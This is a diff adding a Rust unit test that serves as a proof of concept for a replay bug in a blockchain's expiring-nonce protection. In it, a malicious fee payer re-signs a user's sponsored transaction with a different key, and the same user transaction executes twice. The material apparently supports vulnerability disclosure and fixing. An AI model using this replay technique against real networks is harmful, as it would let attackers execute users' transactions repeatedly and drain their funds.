@@ -2201,4 +2201,133 @@ mod tests {
 
         Ok(())
     }
+
+    /// POC: Demonstrates that a malicious fee payer can replay a sponsored expiring nonce
+    /// transaction by re-signing with different keys, bypassing the EVM handler's replay
+    /// protection in `check_and_mark_expiring_nonce`.
+    ///
+    /// The handler uses `tempo_tx_env.tx_hash` (derived from the full RLP encoding
+    /// including fee payer signature bytes) to key the expiring nonce seen-set. Since
+    /// `encode_for_signing` replaces the fee payer signature with a placeholder, the
+    /// user's `signature_hash` is invariant to fee payer changes. A malicious fee payer
+    /// can thus re-sign with a different secp256k1 key, produce a new tx_hash, and replay
+    /// the user's transaction within the validity window.
+    #[test]
+    fn test_expiring_nonce_fee_payer_replay_bypasses_protection() -> eyre::Result<()> {
+        use alloy_signer::SignerSync;
+        use alloy_signer_local::PrivateKeySigner;
+        use tempo_primitives::transaction::TEMPO_EXPIRING_NONCE_KEY;
+
+        let key_pair = P256KeyPair::random();
+        let caller = key_pair.address;
+        let timestamp = 1000u64;
+        let valid_before = timestamp + 30;
+
+        // Two different fee payers (secp256k1 signers)
+        let fee_payer_a = PrivateKeySigner::random();
+        let fee_payer_b = PrivateKeySigner::random();
+
+        let mut evm = create_funded_evm_t1_with_timestamp(caller, timestamp);
+
+        // --- Build sponsored expiring nonce tx with fee payer A ---
+        let mut tx_a = TempoTransaction {
+            chain_id: 1,
+            nonce_key: TEMPO_EXPIRING_NONCE_KEY,
+            nonce: 0,
+            valid_before: Some(valid_before),
+            gas_limit: 2_000_000,
+            calls: vec![Call {
+                to: TxKind::Call(IDENTITY_PRECOMPILE),
+                value: U256::ZERO,
+                input: Bytes::new(),
+            }],
+            // Placeholder — will be replaced with actual fee payer sig below
+            fee_payer_signature: Some(alloy_primitives::Signature::new(
+                U256::ZERO,
+                U256::ZERO,
+                false,
+            )),
+            ..Default::default()
+        };
+
+        // User signs over signature_hash (fee payer sig is placeholder byte)
+        let user_sig_hash = tx_a.signature_hash();
+        let signed_a = key_pair.sign_tx(tx_a.clone())?;
+
+        // Now sign the fee payer hash with fee payer A's secp256k1 key
+        let fp_sig_hash_a = tx_a.fee_payer_signature_hash(caller);
+        let fp_sig_a = fee_payer_a.sign_hash_sync(&fp_sig_hash_a)?;
+        tx_a.fee_payer_signature = Some(fp_sig_a);
+
+        // Reconstruct the AASigned with the real fee payer signature
+        let signed_a = tempo_primitives::transaction::AASigned::new_unhashed(
+            tx_a.clone(),
+            signed_a.signature().clone(),
+        );
+
+        // Execute tx A — should succeed and mark tx_hash_a as seen
+        let tx_env_a = TempoTxEnv::from_recovered_tx(&signed_a, caller);
+        let result_a = evm.transact_commit(tx_env_a)?;
+        assert!(
+            result_a.is_success(),
+            "First tx should succeed: {result_a:?}"
+        );
+
+        // Legitimate replay: same signed tx should fail (tx_hash_a already seen)
+        let tx_env_a_replay = TempoTxEnv::from_recovered_tx(&signed_a, caller);
+        let result_a_replay = evm.transact_commit(tx_env_a_replay);
+        assert!(
+            result_a_replay.is_err(),
+            "Exact replay of tx A should be rejected by expiring nonce protection"
+        );
+
+        // Re-fund the caller (gas was consumed)
+        fund_account(&mut evm, caller);
+
+        // --- Attacker: same tx, different fee payer ---
+        let mut tx_b = tx_a.clone();
+        // Fee payer B signs the same fee_payer_signature_hash (it depends on caller + tx
+        // fields, not on the fee payer's identity)
+        let fp_sig_hash_b = tx_b.fee_payer_signature_hash(caller);
+        assert_eq!(
+            fp_sig_hash_a, fp_sig_hash_b,
+            "fee_payer_signature_hash should be the same for both"
+        );
+        let fp_sig_b = fee_payer_b.sign_hash_sync(&fp_sig_hash_b)?;
+        tx_b.fee_payer_signature = Some(fp_sig_b);
+
+        // User's signature_hash is still the same
+        assert_eq!(
+            user_sig_hash,
+            tx_b.signature_hash(),
+            "User signature_hash must be invariant to fee payer signature changes"
+        );
+
+        // Construct the "replayed" signed tx with the same user signature
+        let signed_b = tempo_primitives::transaction::AASigned::new_unhashed(
+            tx_b,
+            signed_a.signature().clone(),
+        );
+
+        // The tx hashes MUST differ — this is the root cause
+        assert_ne!(
+            signed_a.hash(),
+            signed_b.hash(),
+            "Different fee payer signatures must produce different tx hashes"
+        );
+
+        // Execute tx B on the SAME EVM — replay protection should reject this
+        // but doesn't because it keys on tx_hash (which changed).
+        let tx_env_b = TempoTxEnv::from_recovered_tx(&signed_b, caller);
+        let result_b = evm.transact_commit(tx_env_b)?;
+
+        // BUG: The replayed transaction succeeds.
+        assert!(
+            result_b.is_success(),
+            "BUG CONFIRMED: Replayed tx with different fee payer sig should have been \
+             rejected, but was accepted. The user's transaction was executed twice."
+        );
+
+        Ok(())
+    }
 }
